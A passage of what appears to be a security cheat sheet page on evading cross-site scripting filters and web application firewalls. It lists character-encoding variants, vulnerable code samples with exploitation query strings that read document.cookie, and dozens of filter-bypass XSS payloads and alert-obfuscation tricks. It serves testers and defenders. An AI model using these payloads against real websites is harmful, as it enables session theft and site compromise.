<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">contentType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span><span class="w"> </span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">title</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;This is a regular title&quot;</span><span class="p">;</span>
<span class="err"></span>
<span class="c1">//some user agreement and sending to server logic might be here</span>
<span class="err"></span>
<span class="o">&lt;</span><span class="err">/script&gt;</span>
</code></pre></div>
<p>As a result, in this example the main flaw is trusting the content_type in the <code>Share</code> page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS.</p>
<h2 id="character-escape-sequences">Character Escape Sequences<a class="headerlink" href="#character-escape-sequences" title="Permanent link">&para;</a></h2>
<p>Here are all the possible combinations of the character <code>\&lt;</code> in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above.</p>
<ul>
<li><code>&lt;</code></li>
<li><code>%3C</code></li>
<li><code>&amp;lt</code></li>
<li><code>&amp;lt;</code></li>
<li><code>&amp;LT</code></li>
<li><code>&amp;LT;</code></li>
<li><code>&amp;#60;</code></li>
<li><code>&amp;#060;</code></li>
<li><code>&amp;#0060;</code></li>
<li><code>&amp;#00060;</code></li>
<li><code>&amp;#000060;</code></li>
<li><code>&amp;#0000060;</code></li>
<li><code>&amp;#60;</code></li>
<li><code>&amp;#060;</code></li>
<li><code>&amp;#0060;</code></li>
<li><code>&amp;#00060;</code></li>
<li><code>&amp;#000060;</code></li>
<li><code>&amp;#0000060;</code></li>
<li><code>&amp;#x3c;</code></li>
<li><code>&amp;#x03c;</code></li>
<li><code>&amp;#x003c;</code></li>
<li><code>&amp;#x0003c;</code></li>
<li><code>&amp;#x00003c;</code></li>
<li><code>&amp;#x000003c;</code></li>
<li><code>&amp;#x3c;</code></li>
<li><code>&amp;#x03c;</code></li>
<li><code>&amp;#x003c;</code></li>
<li><code>&amp;#x0003c;</code></li>
<li><code>&amp;#x00003c;</code></li>
<li><code>&amp;#x000003c;</code></li>
<li><code>&amp;#X3c;</code></li>
<li><code>&amp;#X03c;</code></li>
<li><code>&amp;#X003c;</code></li>
<li><code>&amp;#X0003c;</code></li>
<li><code>&amp;#X00003c;</code></li>
<li><code>&amp;#X000003c;</code></li>
<li><code>&amp;#X3c;</code></li>
<li><code>&amp;#X03c;</code></li>
<li><code>&amp;#X003c;</code></li>
<li><code>&amp;#X0003c;</code></li>
<li><code>&amp;#X00003c;</code></li>
<li><code>&amp;#X000003c;</code></li>
<li><code>&amp;#x3C;</code></li>
<li><code>&amp;#x03C;</code></li>
<li><code>&amp;#x003C;</code></li>
<li><code>&amp;#x0003C;</code></li>
<li><code>&amp;#x00003C;</code></li>
<li><code>&amp;#x000003C;</code></li>
<li><code>&amp;#x3C;</code></li>
<li><code>&amp;#x03C;</code></li>
<li><code>&amp;#x003C;</code></li>
<li><code>&amp;#x0003C;</code></li>
<li><code>&amp;#x00003C;</code></li>
<li><code>&amp;#x000003C;</code></li>
<li><code>&amp;#X3C;</code></li>
<li><code>&amp;#X03C;</code></li>
<li><code>&amp;#X003C;</code></li>
<li><code>&amp;#X0003C;</code></li>
<li><code>&amp;#X00003C;</code></li>
<li><code>&amp;#X000003C;</code></li>
<li><code>&amp;#X3C;</code></li>
<li><code>&amp;#X03C;</code></li>
<li><code>&amp;#X003C;</code></li>
<li><code>&amp;#X0003C;</code></li>
<li><code>&amp;#X00003C;</code></li>
<li><code>&amp;#X000003C;</code></li>
<li><code>\x3c</code></li>
<li><code>\x3C</code></li>
<li><code>\u003c</code></li>
<li><code>\u003C</code></li>
</ul>
<h2 id="methods-to-bypass-waf-cross-site-scripting">Methods to Bypass WAF  Cross-Site Scripting<a class="headerlink" href="#methods-to-bypass-waf-cross-site-scripting" title="Permanent link">&para;</a></h2>
<h3 id="general-issues">General issues<a class="headerlink" href="#general-issues" title="Permanent link">&para;</a></h3>
<h4 id="stored-xss">Stored XSS<a class="headerlink" href="#stored-xss" title="Permanent link">&para;</a></h4>
<p>If an attacker managed to push XSS through the filter, WAF wouldnt be able to prevent the attack conduction.</p>
<h4 id="reflected-xss-in-javascript">Reflected XSS in JavaScript<a class="headerlink" href="#reflected-xss-in-javascript" title="Permanent link">&para;</a></h4>
<p>Example:</p>
<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="nx">setTimeout</span><span class="p">(</span><span class="err">\\</span><span class="s2">&quot;writetitle()\\&quot;</span><span class="p">,</span><span class="nx">$</span><span class="err">\</span><span class="nx">_GET</span><span class="err">\</span><span class="p">[</span><span class="nx">xss</span><span class="err">\</span><span class="p">])</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</code></pre></div>
<p>Exploitation:</p>
<div class="highlight"><pre><span></span><code><span class="sr">/?xss=500);alert(document.cookie);/</span><span class="o">/</span>
</code></pre></div>
<h4 id="dom-based-xss">DOM-based XSS<a class="headerlink" href="#dom-based-xss" title="Permanent link">&para;</a></h4>
<p>Example:</p>
<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="nb">eval</span><span class="p">(</span><span class="nx">$</span><span class="err">\</span><span class="nx">_GET</span><span class="err">\</span><span class="p">[</span><span class="nx">xss</span><span class="err">\</span><span class="p">]);</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</code></pre></div>
<p>Exploitation:</p>
<div class="highlight"><pre><span></span><code><span class="err">/?xss=document.cookie</span>
</code></pre></div>
<h4 id="xss-via-request-redirection">XSS via request Redirection<a class="headerlink" href="#xss-via-request-redirection" title="Permanent link">&para;</a></h4>
<p>Vulnerable code:</p>
<div class="highlight"><pre><span></span><code><span class="p">...</span>
<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location:&#39;</span><span class="p">.</span><span class="nx">$_GET</span><span class="p">[</span><span class="s1">&#39;param&#39;</span><span class="p">]);</span>
<span class="p">...</span>
</code></pre></div>
<p>As well as:</p>
<div class="highlight"><pre><span></span><code><span class="p">...</span>
<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Refresh:0;URL=&#39;</span><span class="p">.</span><span class="nx">$_GET</span><span class="p">[</span><span class="s1">&#39;param&#39;</span><span class="p">]);</span>
<span class="p">...</span>
</code></pre></div>
<p>This request will not pass through the WAF:</p>
<div class="highlight"><pre><span></span><code>/?param=<span class="p">&lt;</span><span class="nt">javascript:alert</span><span class="err">(</span><span class="na">document</span><span class="err">.</span><span class="na">cookie</span><span class="p">&gt;</span>)
</code></pre></div>
<p>This request will pass through the WAF and an XSS attack will be conducted in certain browsers:</p>
<div class="highlight"><pre><span></span><code>/?param=<span class="p">&lt;</span><span class="nt">data:text</span><span class="err">/</span><span class="na">html</span><span class="err">;</span><span class="na">base64</span><span class="err">,</span><span class="na">PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4</span><span class="o">=</span>
</code></pre></div>
<h3 id="waf-bypass-strings-for-xss">WAF ByPass Strings for XSS<a class="headerlink" href="#waf-bypass-strings-for-xss" title="Permanent link">&para;</a></h3>
<!-- markdownlint-disable MD038-->
<ul>
<li><code>&lt;Img src = x onerror = "javascript: window.onerror = alert; throw XSS"&gt;</code></li>
<li><code>&lt;Video&gt; &lt;source onerror = "javascript: alert (XSS)"&gt;</code></li>
<li><code>&lt;Input value = "XSS" type = text&gt;</code></li>
<li><code>&lt;applet code="javascript:confirm(document.cookie);"&gt;</code></li>
<li><code>&lt;isindex x="javascript:" onmouseover="alert(XSS)"&gt;</code></li>
<li><code>"&gt;&lt;/SCRIPT&gt;&gt;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</code></li>
<li><code>"&gt;&lt;img src="x:x" onerror="alert(XSS)"&gt;</code></li>
<li><code>"&gt;&lt;iframe src="javascript:alert(XSS)"&gt;</code></li>
<li><code>&lt;object data="javascript:alert(XSS)"&gt;</code></li>
<li><code>&lt;isindex type=image src=1 onerror=alert(XSS)&gt;</code></li>
<li><code>&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;</code></li>
<li><code>&lt;img  src="x:gif" onerror="window['al\u0065rt'](0)"&gt;&lt;/img&gt;</code></li>
<li><code>&lt;iframe/src="data:text/html,&lt;svg onload=alert(1)&gt;"&gt;</code></li>
<li><code>&lt;meta content="&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)" http-equiv="refresh"/&gt;</code></li>
<li><code>&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open('https://www.google.com/')&gt;&lt;/script</code></li>
<li><code>&lt;meta http-equiv="refresh" content="0;url=javascript:confirm(1)"&gt;</code></li>
<li><code>&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;</code></li>
<li><code>&lt;form&gt;&lt;a href="javascript:\u0061lert(1)"&gt;X</code></li>
<li><code>&lt;/script&gt;&lt;img/*%00/src="worksinchrome&amp;colon;prompt(1)"/%00*/onerror='eval(src)'&gt;</code></li>
<li><code>&lt;style&gt;//*{x:expression(alert(/xss/))}//&lt;style&gt;&lt;/style&gt;</code></li>
</ul>
<p>On Mouse Over:</p>
<ul>
<li><code>&lt;img src="/" =_=" title="onerror='prompt(1)'"&gt;</code></li>
<li><code>&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script:&amp;#97lert(1)&gt;ClickMe</code></li>
<li><code>&lt;script x&gt; alert(1) &lt;/script 1=2</code></li>
<li><code>&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME</code></li>
<li><code>&lt;input/onmouseover="javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;"</code></li>
<li><code>&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;&lt;/iframe&gt;</code></li>
<li><code>&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"&gt;&lt;PARAM NAME="DataURL" VALUE="javascript:alert(1)"&gt;&lt;/OBJECT&gt;</code></li>
</ul>
<!-- markdownlint-enable MD038-->

<h3 id="filter-bypass-alert-obfuscation">Filter Bypass Alert Obfuscation<a class="headerlink" href="#filter-bypass-alert-obfuscation" title="Permanent link">&para;</a></h3>
<ul>
<li><code>(alert)(1)</code></li>
<li><code>a=alert,a(1)</code></li>
<li><code>[1].find(alert)</code></li>
<li><code>top[al+ert](1)</code></li>
<li><code>top[/al/.source+/ert/.source](1)</code></li>
<li><code>al\u0065rt(1)</code></li>
<li><code>top[al\145rt](1)</code></li>
<li><code>top[al\x65rt](1)</code></li>
<li><code>top[8680439..toString(30)](1)</code></li>
<li><code>alert?.()</code></li>
<li><code>(alert())</code></li>
</ul>
<p>The payload should include leading and trailing backticks:</p>
<div class="highlight"><pre><span></span><code><span class="o">&amp;</span><span class="err">#</span><span class="mf">96</span><span class="p">;</span><span class="sb">`</span><span class="si">${</span><span class="nx">alert</span><span class="sb">``</span><span class="si">}</span><span class="sb">`</span><span class="o">&amp;</span><span class="err">#</span><span class="mf">96</span><span class="p">;</span>
</code></pre></div>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright <script>document.write(new Date().getFullYear())</script> - Cheat Sheets Series Team - This work is licensed under <a rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International</a>.
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.sections", "navigation.expand"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../assets/javascripts/bundle.83f73b43.min.js"></script>
      
    
  </body>
</html>